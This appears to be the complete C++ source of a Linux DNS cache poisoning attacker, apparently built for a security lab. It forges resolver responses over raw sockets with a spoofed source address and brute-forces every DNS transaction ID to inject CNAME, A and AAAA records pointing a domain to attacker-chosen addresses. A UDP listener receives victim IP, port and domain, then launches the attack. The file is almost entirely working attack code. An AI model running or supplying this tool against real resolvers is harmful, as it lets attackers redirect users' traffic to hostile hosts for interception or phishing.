// DNS Cache Poisoning Attacker (Linux)
// Sends spoofed DNS responses with brute-forced transaction IDs using raw sockets
// Compile: g++ linux_attacker.cpp -o linux_attacker
///////////////////////////////////////////////////////////////
// 8775.ts.aksecuritylab.net  CNAME  ts.securitylab.com
// ts.securitylab.com         A      1.2.3.4
///////////////////////////////////////////////////////////////

#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <cstring>
#include <cstdlib>
#include <algorithm>
#include <cctype>
#include <net/if.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <random>
#include <string>

using namespace std;

/////////////constants//////////////
const uint16_t TXID_START = 0;
const uint16_t TXID_END = 65535; // inclusive
const string DNS_IP = "192.0.2.220";
const uint16_t DNS_PORT = 53;
const string FORGED_DOMAIN = "example.com";
string FORGED_ANSWER_IP = "192.0.2.66";
bool RAND_FORGED_IP = true;
const string FORGED_IP_PREFIX = "6.6.6.";
/////////////////////////////////////

static const char BIND_IFACE[] = "ens5";

auto lasttime = chrono::high_resolution_clock::now();

static int raw_sock = -1;

// IP header structure
struct ip_header
{
       uint8_t ihl : 4;
       uint8_t version : 4;
       uint8_t tos;
       uint16_t tot_len;
       uint16_t id;
       uint16_t frag_off;
       uint8_t ttl;
       uint8_t protocol;
       uint16_t check;
       uint32_t saddr;
       uint32_t daddr;
} __attribute__((packed));

// UDP header structure
struct udp_header
{
       uint16_t source;
       uint16_t dest;
       uint16_t len;
       uint16_t check;
} __attribute__((packed));

// DNS header structure
struct dns_header
{
       uint16_t id;      // Transaction ID
       uint16_t flags;   // Flags: QR=1, AA=1, RD=0, RA=0, RCODE=0
       uint16_t qdcount; // Question count
       uint16_t ancount; // Answer count
       uint16_t nscount; // Authority count
       uint16_t arcount; // Additional count
} __attribute__((packed));

uint16_t checksum(uint16_t *buf, int nwords)
{
       uint32_t sum = 0;
       for (; nwords > 0; nwords--)
              sum += *buf++;
       while (sum >> 16)
              sum = (sum & 0xffff) + (sum >> 16);
       return (uint16_t)(~sum);
}

struct pseudo_header_udp
{
       uint32_t src_addr;
       uint32_t dst_addr;
       uint8_t zero;
       uint8_t protocol;
       uint16_t udp_length;
};

uint16_t udp_checksum(uint32_t src_ip, uint32_t dst_ip, const uint8_t *packet, int packet_len)
{
       int psize = sizeof(pseudo_header_udp) + packet_len;
       uint8_t buf[psize];
       pseudo_header_udp ph;
       ph.src_addr = src_ip;
       ph.dst_addr = dst_ip;
       ph.zero = 0;
       ph.protocol = IPPROTO_UDP;
       ph.udp_length = htons(packet_len);

       memcpy(buf, &ph, sizeof(ph));
       memcpy(buf + sizeof(ph), packet, packet_len);

       return checksum((uint16_t *)buf, psize / 2 + psize % 2);
}

// --- DNS payload helper writers (improve readability) ---
static inline void write_u8(uint8_t *buf, size_t &off, uint8_t v)
{
       buf[off++] = v;
}

static inline void write_u16(uint8_t *buf, size_t &off, uint16_t v)
{
       uint16_t *p = (uint16_t *)(buf + off);
       *p = htons(v);
       off += 2;
}

static inline void write_u32(uint8_t *buf, size_t &off, uint32_t v)
{
       uint32_t *p = (uint32_t *)(buf + off);
       *p = htonl(v);
       off += 4;
}

static inline size_t encode_name(uint8_t *buf, size_t &off, const std::string &name)
{
       size_t start = off;
       std::string copy = name;
       size_t pos = 0;
       while ((pos = copy.find('.')) != std::string::npos)
       {
              std::string label = copy.substr(0, pos);
              write_u8(buf, off, (uint8_t)label.length());
              memcpy(buf + off, label.c_str(), label.length());
              off += label.length();
              copy = copy.substr(pos + 1);
       }
       if (!copy.empty())
       {
              write_u8(buf, off, (uint8_t)copy.length());
              memcpy(buf + off, copy.c_str(), copy.length());
              off += copy.length();
       }
       write_u8(buf, off, 0); // root label
       return start;
}

void send_dns_response(const char *victim_ip, uint16_t victim_port, uint16_t txid, const string &domain)
{
       // Full packet buffer: IP + UDP + DNS
       uint8_t packet[4096];
       memset(packet, 0, sizeof(packet));

       // Build DNS payload
       uint8_t dns_payload[512];
       memset(dns_payload, 0, sizeof(dns_payload));

       // Build DNS header
       dns_header *dns = (dns_header *)dns_payload;
       dns->id = htons(txid);      // Use brute-forced TXID
       dns->flags = htons(0x8180); // QR=1(response), AA=0, RD=0, RA=1, RCODE=0
       dns->qdcount = htons(1);    // 1 question
       dns->ancount = htons(3);    // 2 answers (CNAME + A)
       dns->nscount = htons(0);
       dns->arcount = htons(1); // 1 OPT record for EDNS

       // Offsets for building sections
       size_t dns_offset = sizeof(dns_header);
       size_t question_start = dns_offset;

       // Question
       encode_name(dns_payload, dns_offset, domain);
       write_u16(dns_payload, dns_offset, 1); // QTYPE A
       write_u16(dns_payload, dns_offset, 1); // QCLASS IN

       // Answer: CNAME -> FORGED_DOMAIN (use 16-bit compression pointer)
       {
              uint16_t ptr = htons(0xC000 | (uint16_t)question_start);
              memcpy(dns_payload + dns_offset, &ptr, 2);
              dns_offset += 2;
       }
       write_u16(dns_payload, dns_offset, 5);    // TYPE CNAME
       write_u16(dns_payload, dns_offset, 1);    // CLASS IN
       write_u32(dns_payload, dns_offset, 3600); // TTL

       // Reserve rdlength for CNAME, fill later
       size_t cname_len_pos = dns_offset;
       write_u16(dns_payload, dns_offset, 0);
       size_t cname_start = dns_offset;
       encode_name(dns_payload, dns_offset, FORGED_DOMAIN);
       // Fill rdlen
       uint16_t *cname_rdlen = (uint16_t *)(dns_payload + cname_len_pos);
       *cname_rdlen = htons((uint16_t)(dns_offset - cname_start));

       // Additional: A record for FORGED_DOMAIN (use 16-bit compression pointer)
       {
              uint16_t ptr = htons(0xC000 | (uint16_t)cname_start);
              memcpy(dns_payload + dns_offset, &ptr, 2);
              dns_offset += 2;
       }
       write_u16(dns_payload, dns_offset, 1);    // TYPE A
       write_u16(dns_payload, dns_offset, 1);    // CLASS IN
       write_u32(dns_payload, dns_offset, 3600); // TTL
       write_u16(dns_payload, dns_offset, 4);    // RDLENGTH
       inet_pton(AF_INET, FORGED_ANSWER_IP.c_str(), dns_payload + dns_offset);
       dns_offset += 4;

       // ==================== AAAA record ====================
       {
              uint16_t ptr = htons(0xC000 | (uint16_t)cname_start); // compression pointer to domain
              memcpy(dns_payload + dns_offset, &ptr, 2);
              dns_offset += 2;
       }
       write_u16(dns_payload, dns_offset, 28);   // TYPE AAAA
       write_u16(dns_payload, dns_offset, 1);    // CLASS IN
       write_u32(dns_payload, dns_offset, 3600); // TTL
       write_u16(dns_payload, dns_offset, 16);   // RDLENGTH (IPv6 = 16 bytes)

       // The IPv6 address you want to return
       inet_pton(AF_INET6, "aaaa:aaaa:aaaa:aaaa::", dns_payload + dns_offset);
       dns_offset += 16;

       // OPT (EDNS) record
       write_u8(dns_payload, dns_offset, 0x00);  // name root
       write_u16(dns_payload, dns_offset, 41);   // TYPE OPT
       write_u16(dns_payload, dns_offset, 4096); // UDP payload size
       // EDNS header: extended RCODE(8) | version(8) | flags(16)
       write_u32(dns_payload, dns_offset, 0x00008000); // DO bit set
       write_u16(dns_payload, dns_offset, 0);          // RDLEN

       size_t dns_len = dns_offset;

       // Build UDP header
       udp_header *udph = (udp_header *)(packet + sizeof(ip_header));
       udph->source = htons(DNS_PORT); // Source port 53 (DNS server)
       udph->dest = htons(victim_port);
       udph->len = htons(sizeof(udp_header) + dns_len);
       udph->check = 0; // Will calculate later

       // Copy DNS payload after UDP header
       memcpy(packet + sizeof(ip_header) + sizeof(udp_header), dns_payload, dns_len);

       // Calculate UDP checksum
       uint32_t src_ip, dst_ip;
       inet_pton(AF_INET, DNS_IP.c_str(), &src_ip);
       inet_pton(AF_INET, victim_ip, &dst_ip);

       udph->check = udp_checksum(src_ip, dst_ip,
                                  (uint8_t *)udph,
                                  sizeof(udp_header) + dns_len);

       // Build IP header
       ip_header *iph = (ip_header *)packet;
       iph->version = 4;
       iph->ihl = 5;
       iph->tos = 0;
       iph->tot_len = htons(sizeof(ip_header) + sizeof(udp_header) + dns_len);
       iph->id = htons(rand() % 65535);
       iph->frag_off = 0;
       iph->ttl = 64;
       iph->protocol = IPPROTO_UDP;
       iph->check = 0; // Will calculate
       iph->saddr = src_ip;
       iph->daddr = dst_ip;

       // Calculate IP checksum
       iph->check = checksum((uint16_t *)iph, sizeof(ip_header) / 2);

       // Send raw packet
       if (raw_sock < 0)
       {
              raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
              if (raw_sock < 0)
              {
                     perror("socket RAW");
                     return;
              }

              // bind raw socket to specific interface to ensure egress via ens5
              if (setsockopt(raw_sock, SOL_SOCKET, SO_BINDTODEVICE, BIND_IFACE, sizeof(BIND_IFACE)) < 0)
              {
                     perror("setsockopt SO_BINDTODEVICE");
                     // non-fatal: continue
              }

              int one = 1;
              if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
              {
                     perror("setsockopt IP_HDRINCL");
                     close(raw_sock);
                     raw_sock = -1;
                     return;
              }
       }

       struct sockaddr_in dst;
       memset(&dst, 0, sizeof(dst));
       dst.sin_family = AF_INET;
       dst.sin_addr.s_addr = dst_ip;

       size_t total_len = sizeof(ip_header) + sizeof(udp_header) + dns_len;
       ssize_t sent = sendto(raw_sock, packet, total_len, 0,
                             (struct sockaddr *)&dst, sizeof(dst));
       if (sent < 0)
       {
              perror("sendto RAW");
       }
}

void perform_brute_force(const char *victim_ip, uint16_t victim_port, const string &domain)
{
       auto t1 = chrono::high_resolution_clock::now();
       int cnt = 1;
       for (uint16_t txid = TXID_START; txid <= TXID_END - 1; txid++)
       {
              send_dns_response(victim_ip, victim_port, txid, domain);
              cnt++;
              // if (cnt % 50 == 0)
              // {
              //        // sleep 1 ms
              //        this_thread::sleep_for(chrono::milliseconds(1));
              //        // this_thread::sleep_for(chrono::microseconds(500));
              //        // this_thread::sleep_for(chrono::microseconds(200));
              // }
              this_thread::sleep_for(chrono::microseconds(1));
              // this_thread::sleep_for(chrono::microseconds(1));
              // this_thread::sleep_for(chrono::nanoseconds(10)); // Sleep for 100 nanoseconds (1 microsecond)
       }
       send_dns_response(victim_ip, victim_port, TXID_END, domain);
       auto t2 = chrono::high_resolution_clock::now();
       auto duration = chrono::duration_cast<chrono::milliseconds>(t2 - t1).count();
       cout << "[+] DNS brute-force completed in " << duration << " ms" << endl;
}

void change_forged_ip()
{
       if (RAND_FORGED_IP)
       {
              FORGED_ANSWER_IP = FORGED_IP_PREFIX + to_string(rand() % 256);
              std::cout << "[+] Changed forged answer IP to: " << FORGED_ANSWER_IP << std::endl;
       }
}

void perform_attack(string victim_ip, uint16_t victim_port, std::string domain)
{
       cout << "\n[+] Starting DNS cache poisoning attack..." << endl;
       cout << "    Victim: " << victim_ip << ":" << victim_port << endl;
       cout << "    attacker domain: " << domain << endl;
       cout << "    Spoofed IP: " << FORGED_ANSWER_IP << endl;
       cout << "    Brute force range: " << TXID_END - TXID_START << endl;
       change_forged_ip();

       this_thread::sleep_for(chrono::milliseconds(10));

       auto start = chrono::high_resolution_clock::now();
       perform_brute_force(victim_ip.c_str(), victim_port, domain);
       auto end = chrono::high_resolution_clock::now();
       auto duration = chrono::duration_cast<chrono::milliseconds>(end - start).count();

       cout << "    Attack completed in " << duration << " ms" << endl;
}

int listener()
{
       const int LISTEN_PORT = 9999;
       int sock = socket(AF_INET, SOCK_DGRAM, 0);
       if (sock < 0)
       {
              perror("listener: socket");
              return 1;
       }

       struct sockaddr_in addr;
       memset(&addr, 0, sizeof(addr));
       addr.sin_family = AF_INET;
       addr.sin_addr.s_addr = INADDR_ANY;
       addr.sin_port = htons(LISTEN_PORT);

       if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
       {
              perror("listener: bind");
              close(sock);
              return 1;
       }

       cout << "[listener] Waiting for victim info on UDP port " << LISTEN_PORT << endl;
       cout << "[listener] Expected format: IP:PORT:DOMAIN" << endl;

       while (true)
       {
              char buf[256];
              struct sockaddr_in src;
              socklen_t srclen = sizeof(src);
              ssize_t len = recvfrom(sock, buf, sizeof(buf) - 1, 0, (struct sockaddr *)&src, &srclen);

              if (len < 0)
              {
                     perror("listener: recvfrom");
                     break;
              }

              buf[len] = '\0';
              string msg(buf);
              // Trim whitespace
              msg.erase(remove_if(msg.begin(), msg.end(), ::isspace), msg.end());

              // Expect format IP:PORT:DOMAIN
              size_t p1 = msg.find(':');
              if (p1 == string::npos)
              {
                     cerr << "[listener] Invalid message format: '" << msg << "'" << endl;
                     cerr << "[listener] Expected: IP:PORT:DOMAIN" << endl;
                     continue;
              }

              size_t p2 = msg.find(':', p1 + 1);
              if (p2 == string::npos)
              {
                     cerr << "[listener] Invalid message format: '" << msg << "'" << endl;
                     cerr << "[listener] Expected: IP:PORT:DOMAIN" << endl;
                     continue;
              }

              string victim_ip = msg.substr(0, p1);
              string port_s = msg.substr(p1 + 1, p2 - p1 - 1);
              string domain = msg.substr(p2 + 1);

              uint16_t victim_port = 0;
              try
              {
                     victim_port = (uint16_t)stoul(port_s);
              }
              catch (...)
              {
                     cerr << "[listener] Parse error for message: '" << msg << "'" << endl;
                     continue;
              }

              cout << "[listener] Received victim=" << victim_ip << ":" << victim_port << " domain=" << domain << endl;
              cout << "[listener] Launching attack..." << endl;
              perform_attack(victim_ip, victim_port, domain);
       }

       close(sock);
       return 0;
}

int main(int argc, char **argv)
{
       prctl(PR_SET_TIMERSLACK, 1);
       cout << string(60, '=') << endl;
       cout << "DNS Cache Poisoning Attacker (C++)" << endl;
       cout << string(60, '=') << endl;
       listener();
       cout << "\n[+] Attacker shutdown" << endl;
       return 0;
}
